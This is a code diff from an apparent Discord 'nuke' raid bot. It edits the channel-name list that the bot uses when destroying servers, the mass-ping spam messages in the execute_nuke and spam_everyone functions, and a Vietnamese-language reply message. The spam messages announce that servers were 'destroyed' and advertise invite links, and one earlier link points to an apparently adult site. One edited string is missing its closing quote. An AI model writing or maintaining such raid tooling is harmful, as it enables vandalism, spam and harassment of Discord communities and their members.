@@ -203,7 +203,7 @@ NUKE_CHANNEL_NAMES = [
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
     "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
-    "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼D 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
+    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝕋ℍ𝕀 𝔻𝔼̣ℙ 𝔾𝔸́𝕀,
     "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
 ]
 
@@ -320,7 +320,7 @@ async def execute_nuke(guild):
             "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"|| link support 1 ||: https://xnhau.pics/"\n'
+            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
             ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
         )
         valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
@@ -818,7 +818,7 @@ async def spam_everyone(ctx):
             "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT(●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"|| link support 1 ||: https://xnhau.pics/"\n'
+            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
             ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
         )
         embed = discord.Embed(
@@ -2780,7 +2780,7 @@ async def on_message(message):
                 except:
                     owner_user = None
             if owner_user:
-                await message.reply(f"{owner_user.mention} boss bảo tui đi đâu rồi ý tý nhắn lại nha")
+                await message.reply(f"{owner_user.mention} ê boss nghe k cs ng gọi kìa")
 
 # ==================== SỰ KIỆN JOIN/LEAVE ====================
 @bot.event
